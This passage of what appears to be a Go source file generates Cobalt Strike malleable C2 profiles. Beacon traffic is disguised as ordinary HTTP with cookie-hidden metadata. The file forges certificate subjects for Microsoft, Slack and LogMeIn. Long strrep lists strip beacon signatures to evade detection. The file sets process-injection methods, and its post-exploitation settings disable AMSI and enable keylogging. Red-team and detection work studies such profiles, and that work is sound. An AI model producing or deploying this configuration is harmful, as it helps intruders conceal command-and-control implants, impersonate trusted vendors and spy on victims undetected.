	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";
	output {
		print;
	}
}
}
`, `
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}
http-get {

{{.Variables.HTTP_GET_URI}}


client {
	header "Host" "{{.Variables.Host}}";
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";

	metadata {
		{{.Variables.metadata_mode}};
		prepend "PREF=ID={{.Variables.CSMValue}}";
		header "Cookie";
	}
}

server {
	header "X-Content-Type-Options" "nosniff";
	header "Content-Encoding" "gzip";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";

	output {
		print;
	}
}
}

http-post {

{{.Variables.HTTP_POST_URI}}

client {
	header "Host" "{{.Variables.Host}}";
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";

	id {
		{{.Variables.metadata_mode}};
		prepend "U={{.Variables.UValue}}";
		prepend "PREF=ID=";
		header "Cookie";
	}

	output {
		print;
	}
}

server {
	header "X-Content-Type-Options" "nosniff";
	header "Content-Encoding" "gzip";
	header "X-XSS-Protection" "1; mode=block";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Cache-Control" "public,max-age={{.Variables.maxage}}";
	header "Age" "{{.Variables.Age}}";
	header "Alternate-Protocol" "80:quic";
	output {
		print;
	}
}
}`,
	`
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "{{.Variables.forward}}";			
}

http-get {


    {{.Variables.HTTP_GET_URI}}

    client {

        header "Accept" "*/*";

        metadata {
            {{.Variables.metadata_mode}};;
            prepend "session-token=";
            append "csm-hit={{.Variables.CSMValue}}";
            header "Cookie";
        }
    }
    server {
        output {
                print;
        }
}
}

http-post {

    {{.Variables.HTTP_POST_URI}}

    client {

        header "Accept" "*/*";
        header "Content-Type" "text/xml";
        header "X-Requested-With" "XMLHttpRequest";

        id {
                {{.Variables.metadata_mode}};;
                prepend "U={{.Variables.UValue}}";
                prepend "REF=ID=";
                header "Cookie";
        }

        output {
                print;
        }
}

    server {

        header "Server" "Server";
        header "X-Frame-Options" "SAMEORIGIN";
        header "x-ua-compatible" "IE=edge";

        output {
            print;
        }
    }
}
`,
}

var Cert = []string{`
set O        "Microsoft Corporation"; #Organization Name
set C        "US"; #Country
set L        "Redmond"; #Locality
set OU       "Microsoft IT"; #Organizational Unit Name
set ST       "WA"; #State or Province
set validity "365"; #Number of days the cert is valid for
}
`, `
set O        "Slack Technologies Inc"; #Organization Name
set C        "US"; #Country
set L        "San Francisco"; #Locality
set OU       "DigiCert Inc"; #Organizational Unit Name
set ST       "CA"; #State or Province
set validity "365"; #Number of days the cert is valid for
}`, `
set O        "LogMeIn Inc."; #Organization Name
set C        "US"; #Country
set L        "Boston"; #Locality
set OU       "DigiCert Inc"; #Organizational Unit Name
set ST       "Massachusetts"; #State or Province
set validity "365"; #Number of days the cert is valid for
}`, `
set O        "Microsoft Corporation"; #Organization Name
set C        "US"; #Country
set L        "Redmond"; #Locality
set OU       "DigiCert Inc"; #Organizational Unit Name
set ST       "Washington"; #State or Province
set validity "365"; #Number of days the cert is valid for
}`, `
https-certificate {
set keystore "{{.Variables.CertName}}";
set password "{{.Variables.Password}}";
}
`}

func Beacon_Com_Struct() string {
	return `
set host_stage "{{.Variables.stage}}";
set sleeptime "{{.Variables.sleep}}";
set jitter    "{{.Variables.jitter}}";
set useragent "{{.Variables.useragent}}";

set data_jitter "{{.Variables.datajitter}}";
set smb_frame_header "";
set pipename "{{.Variables.pipename}}";
set pipename_stager "{{.Variables.pipename_stager}}";

set tcp_frame_header "";
set ssh_banner "{{.Variables.SSH_Banner}}";
set ssh_pipename "{{.Variables.SSH_pipename}}##";

####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}

`
}
func Beacon_Stage_Struct_p1() string {
	return `

stage {
	set obfuscate "true";
	set stomppe "true";
	set cleanup "true";
	set userwx "false";
	set smartinject "true";
	

	#TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
	#They will also obfuscate themselves while they wait to read information from their parent Beacon.
	set sleep_mask "true";
	`
}
func Beacon_Stage_p2_Stuct() string {
	return `
{{.Variables.pe}}
	`
}
func Beacon_GETPOST_Profile_Struct() string {
	return `
	{{.Variables.Profile}}
`
}

func Beacon_SSL_Struct() string {
	return `
	{{.Variables.Cert}}
	`
}

func Beacon_Stage_Struct_p3() string {
	return `
	
	transform-x86 {
		prepend "\x90\x90\x90"; # NOP, NOP!
		strrep "ReflectiveLoader" "";
		strrep "This program cannot be run in DOS mode" "";
		strrep "NtQueueApcThread" "";
		strrep "HTTP/1.1 200 OK" "";
		strrep "Stack memory was corrupted" "";
		strrep "beacon.dll" "";
		strrep "ADVAPI32.dll" "";
		strrep "WININET.dll" "";
		strrep "WS2_32.dll" "";
		strrep "DNSAPI.dll" "";
		strrep "Secur32.dll" "";
		strrep "VirtualProtectEx" "";
		strrep "VirtualProtect" "";
		strrep "VirtualAllocEx" "";
		strrep "VirtualAlloc" "";
		strrep "VirtualFree" "";
		strrep "VirtualQuery" "";
		strrep "RtlVirtualUnwind" "";
		strrep "sAlloc" "";
		strrep "FlsFree" "";
		strrep "FlsGetValue" "";
		strrep "FlsSetValue" "";
		strrep "InitializeCriticalSectionEx" "";
		strrep "CreateSemaphoreExW" "";
		strrep "SetThreadStackGuarantee" "";
		strrep "CreateThreadpoolTimer" "";
		strrep "SetThreadpoolTimer" "";
		strrep "WaitForThreadpoolTimerCallbacks" "";
		strrep "CloseThreadpoolTimer" "";
		strrep "CreateThreadpoolWait" "";
		strrep "SetThreadpoolWait" "";
		strrep "CloseThreadpoolWait" "";
		strrep "FlushProcessWriteBuffers" "";
		strrep "FreeLibraryWhenCallbackReturns" "";
		strrep "GetCurrentProcessorNumber" "";
		strrep "GetLogicalProcessorInformation" "";
		strrep "CreateSymbolicLinkW" "";
		strrep "SetDefaultDllDirectories" "";
		strrep "EnumSystemLocalesEx" "";
		strrep "CompareStringEx" "";
		strrep "GetDateFormatEx" "";
		strrep "GetLocaleInfoEx" "";
		strrep "GetTimeFormatEx" "";
		strrep "GetUserDefaultLocaleName" "";
		strrep "IsValidLocaleName" "";
		strrep "LCMapStringEx" "";
		strrep "GetCurrentPackageId" "";
		strrep "UNICODE" "";
		strrep "UTF-8" "";
		strrep "UTF-16LE" "";
		strrep "MessageBoxW" "";
		strrep "GetActiveWindow" "";
		strrep "GetLastActivePopup" "";
		strrep "GetUserObjectInformationW" "";
		strrep "GetProcessWindowStation" "";
		strrep "Sunday" "";
		strrep "Monday" "";
		strrep "Tuesday" "";
		strrep "Wednesday" "";
		strrep "Thursday" "";
		strrep "Friday" "";
		strrep "Saturday" "";
		strrep "January" "";
		strrep "February" "";
		strrep "March" "";
		strrep "April" "";
		strrep "June" "";
		strrep "July" "";
		strrep "August" "";
		strrep "September" "";
		strrep "October" "";
		strrep "November" "";
		strrep "December" "";
		strrep "MM/dd/yy" "";
		strrep "Stack memory around _alloca was corrupted" "";
		strrep "Unknown Runtime Check Error" "";
		strrep "Unknown Filename" "";
		strrep "Unknown Module Name" "";
		strrep "Run-Time Check Failure #%d - %s" "";
		strrep "Stack corrupted near unknown variable" "";
		strrep "Stack pointer corruption" "";
		strrep "Cast to smaller type causing loss of data" "";
		strrep "Stack memory corruption" "";
		strrep "Local variable used before initialization" "";
		strrep "Stack around _alloca corrupted" "";
		strrep "RegOpenKeyExW" "";
		strrep "egQueryValueExW" "";
		strrep "RegCloseKey" "";
		strrep "LibTomMath" "";
		strrep "Wow64DisableWow64FsRedirection" "";
		strrep "Wow64RevertWow64FsRedirection" "";
		strrep "Kerberos" "";

		}

	transform-x64 {
		prepend "\x90\x90\x90"; # NOP, NOP!
		strrep "ReflectiveLoader" "";
		strrep "This program cannot be run in DOS mode" "";
		strrep "beacon.x64.dll" "";
		strrep "NtQueueApcThread" "";
		strrep "HTTP/1.1 200 OK" "";
		strrep "Stack memory was corrupted" "";
		strrep "beacon.dll" "";
		strrep "ADVAPI32.dll" "";
		strrep "WININET.dll" "";
		strrep "WS2_32.dll" "";
		strrep "DNSAPI.dll" "";
		strrep "Secur32.dll" "";
		strrep "VirtualProtectEx" "";
		strrep "VirtualProtect" "";
		strrep "VirtualAllocEx" "";
		strrep "VirtualAlloc" "";
		strrep "VirtualFree" "";
		strrep "VirtualQuery" "";
		strrep "RtlVirtualUnwind" "";
		strrep "sAlloc" "";
		strrep "FlsFree" "";
		strrep "FlsGetValue" "";
		strrep "FlsSetValue" "";
		strrep "InitializeCriticalSectionEx" "";
		strrep "CreateSemaphoreExW" "";
		strrep "SetThreadStackGuarantee" "";
		strrep "CreateThreadpoolTimer" "";
		strrep "SetThreadpoolTimer" "";
		strrep "WaitForThreadpoolTimerCallbacks" "";
		strrep "CloseThreadpoolTimer" "";
		strrep "CreateThreadpoolWait" "";
		strrep "SetThreadpoolWait" "";
		strrep "CloseThreadpoolWait" "";
		strrep "FlushProcessWriteBuffers" "";
		strrep "FreeLibraryWhenCallbackReturns" "";
		strrep "GetCurrentProcessorNumber" "";
		strrep "GetLogicalProcessorInformation" "";
		strrep "CreateSymbolicLinkW" "";
		strrep "SetDefaultDllDirectories" "";
		strrep "EnumSystemLocalesEx" "";
		strrep "CompareStringEx" "";
		strrep "GetDateFormatEx" "";
		strrep "GetLocaleInfoEx" "";
		strrep "GetTimeFormatEx" "";
		strrep "GetUserDefaultLocaleName" "";
		strrep "IsValidLocaleName" "";
		strrep "LCMapStringEx" "";
		strrep "GetCurrentPackageId" "";
		strrep "UNICODE" "";
		strrep "UTF-8" "";
		strrep "UTF-16LE" "";
		strrep "MessageBoxW" "";
		strrep "GetActiveWindow" "";
		strrep "GetLastActivePopup" "";
		strrep "GetUserObjectInformationW" "";
		strrep "GetProcessWindowStation" "";
		strrep "Sunday" "";
		strrep "Monday" "";
		strrep "Tuesday" "";
		strrep "Wednesday" "";
		strrep "Thursday" "";
		strrep "Friday" "";
		strrep "Saturday" "";
		strrep "January" "";
		strrep "February" "";
		strrep "March" "";
		strrep "April" "";
		strrep "June" "";
		strrep "July" "";
		strrep "August" "";
		strrep "September" "";
		strrep "October" "";
		strrep "November" "";
		strrep "December" "";
		strrep "MM/dd/yy" "";
		strrep "Stack memory around _alloca was corrupted" "";
		strrep "Unknown Runtime Check Error" "";
		strrep "Unknown Filename" "";
		strrep "Unknown Module Name" "";
		strrep "Run-Time Check Failure #%d - %s" "";
		strrep "Stack corrupted near unknown variable" "";
		strrep "Stack pointer corruption" "";
		strrep "Cast to smaller type causing loss of data" "";
		strrep "Stack memory corruption" "";
		strrep "Local variable used before initialization" "";
		strrep "Stack around _alloca corrupted" "";
		strrep "RegOpenKeyExW" "";
		strrep "egQueryValueExW" "";
		strrep "RegCloseKey" "";
		strrep "LibTomMath" "";
		strrep "Wow64DisableWow64FsRedirection" "";
		strrep "Wow64RevertWow64FsRedirection" "";
		strrep "Kerberos" "";
		}
}
`
}
func Process_Inject_Struct() string {
	return `

process-inject {
    # set remote memory allocation technique
	set allocator "{{.Variables.injector}}";

    # shape the content and properties of what we will inject
    set min_alloc "{{.Variables.processinject_min_alloc}}";
    set userwx    "false";
    set startrwx "true";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    # specify how we execute code in the remote process
    execute {
		CreateThread "ntdll.dll!RtlUserThreadStart+0x{{.Variables.ThreadStartNum}}";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread;
		CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
	}
}
`
}
func Beacon_PostEX_Struct() string {
	return `
post-ex {
    # control the temporary process we spawn to
	{{.Variables.Post_EX_Process_Name}}
    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
 
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
 
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";
	
	# control the method used to log keystrokes 
	set keylogger "{{.Variables.Keylogger}}";
}
`
}
